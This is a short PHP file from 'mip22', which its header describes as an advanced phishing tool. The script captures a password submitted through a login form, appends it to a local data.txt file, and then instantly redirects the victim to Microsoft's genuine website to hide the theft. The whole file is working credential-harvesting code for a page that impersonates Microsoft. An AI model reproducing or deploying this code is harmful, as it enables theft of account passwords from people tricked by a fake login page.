<?php 

/*
*  Copyright (c) 2022 Barchampas Gerasimos <makindosxx@gmail.com>.
*  mip22 is a advanced phishing tool.
*
*  mip22 is free software: you can redistribute it and/or modify
*  it under the terms of the GNU Affero General Public License as published by
*  the Free Software Foundation, either version 3 of the License, or
*  (at your option) any later version.
*
*  mip22 is distributed in the hope that it will be useful,
*  but WITHOUT ANY WARRANTY; without even the implied warranty of
*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
*  GNU Affero General Public License for more details.
*
*  You should have received a copy of the GNU Affero General Public License
*  along with this program.  If not, see <http://www.gnu.org/licenses>.
*
*/

// Set File write informations
$file = "data.txt";

file_put_contents($file, "Password: " . $_POST['password'] . "\n", FILE_APPEND);
file_put_contents($file, print_r("/////////////////////////////////////////////////////// \n", true), FILE_APPEND);
file_put_contents($file, print_r("\n", true), FILE_APPEND);

?>

 <meta http-equiv="refresh" content="0; url=https://www.microsoft.com/en-us">  
